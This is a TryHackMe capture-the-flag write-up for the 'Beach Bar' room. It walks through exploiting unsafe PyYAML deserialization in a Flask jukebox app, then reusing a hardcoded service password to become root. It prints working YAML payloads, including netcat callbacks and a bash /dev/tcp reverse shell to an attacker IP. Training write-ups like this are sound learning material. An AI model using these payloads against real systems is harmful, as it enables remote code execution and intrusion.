Beach Bar — TryHackMe Writeup

Room Information

Category: Boot2Root

Difficulty: Easy

🛎️ Concierge Briefing Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something". The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.

The Beach Bar room focuses on identifying an insecure YAML deserialization vulnerability in a Flask application that allows arbitrary Python object execution. After gaining code execution as the bartender user, simple Linux enumeration reveals a second service exposing reused credentials, ultimately leading to root.

Enumeration

The first step was a full TCP scan.

nmap -sCV -p- 10.144.132.46 -T4

Results:

  • 22/tcp — SSH
  • 80/tcp — Gunicorn Flask application

The web application redirected to a login page titled Beach Bar.

Viewing the page source exposed default credentials: 

Username: dj
Password: dj

Logging in revealed a dashboard with Import and Export playlist functionality together with the following hint:

Bring a set from another night: Export the current playlist as YAML, tweak it, and load it back via Import.

Combined with the concierge briefing mentioning that the jukebox had been "wired straight into the floor with the trimmings still attached", this strongly suggested that the import functionality was the intended attack surface.

Testing the YAML Import

After exporting the playlist, it was confirmed that the application accepted YAML input.

The first objective was determining whether the server was using Python's unsafe YAML loader.

Several payloads were tested.

Attempt 1

!!python/object/apply:os.system
["nc IP PORT"]

No useful response.

Attempt 2

!!python/object/apply:os.popen
["nc IP PORT"]

Only a TCP connection was received together with the string: 

<os._wrap_close object at 0x...>

This confirmed that Python objects were being instantiated but no shell was returned.

Attempt 3

!!python/object/new:subprocess
[["ls","-ail"]]

This demonstrated that subprocess objects could be created.

Attempt 4

!!python/object/new:subprocess.check_output
[["ls","-ail"]]

This successfully executed a command and returned its output: 

total 24
app.py
requirements.txt
templates/
...

At this stage arbitrary command execution had been confirmed.

Obtaining Remote Code Execution

After confirming that subprocess execution worked, a reverse shell payload was supplied through the YAML import: 

!!python/object/apply:subprocess.Popen
- [bash, -c, 'bash -i >& /dev/tcp/<ATTACKER-IP>/1234 0>&1']

A Netcat listener immediately received a shell as: 

bartender

Application Analysis

With command execution obtained, the application source code was inspected. 

/opt/beach-bar/webapp/app.py

The vulnerable code was: 

parsed = yaml.load(content, Loader=yaml.Loader)

The use of yaml.Loader instead of yaml.SafeLoader allowed arbitrary Python objects to be deserialized, resulting in Remote Code Execution.

User Enumeration

Basic filesystem enumeration located the user flag. 

find /home -name "user.txt" 2>/dev/null

The flag was stored in: 

/home/user.txt

Reading the file produced the user flag.

Privilege Escalation Enumeration

Standard Linux enumeration was performed:

  • SUID binaries
  • Capabilities
  • Writable files
  • Processes
  • Systemd services

Inspection of running services revealed a custom service: 

systemctl status jukeboxd

Viewing the unit information exposed the complete command line: 

systemctl show jukeboxd
ExecStart=
/opt/beach-bar/venv/bin/python
/opt/beach-bar/jukeboxd/jukeboxd.py
--stream-pass SunsetSpritz2024!
--bitrate 320k

The service passed a hardcoded password as a command-line argument.

Testing the credential with sudo revealed that it had been reused as the root password. 

su root

Password:

SunsetSpritz2024!

Root access was successfully obtained.

Root Flag

After switching to the root account, the root flag was found inside the root user's home directory. 

/root/root.txt

Flags

User

THM{USER_FLAG}

Root

THM{ROOT_FLAG}

Attack Path Summary

  1. Scan the target with Nmap.
  2. Discover SSH and the Beach Bar web application.
  3. View page source and recover the dj: dj credentials.
  4. Notice the YAML Import/Export functionality.
  5. Test Python deserialization using multiple YAML payloads.
  6. Confirm arbitrary command execution using subprocess.check_output().
  7. Execute a reverse shell through subprocess.Popen().
  8. Inspect app.py and confirm unsafe use of yaml.load().
  9. Locate the user flag in /home/user.txt.
  10. Enumerate running services.
  11. Inspect jukeboxd with systemctl show.
  12. Recover the hardcoded stream password.
  13. Reuse the password as the root account password.
  14. Read the root flag.
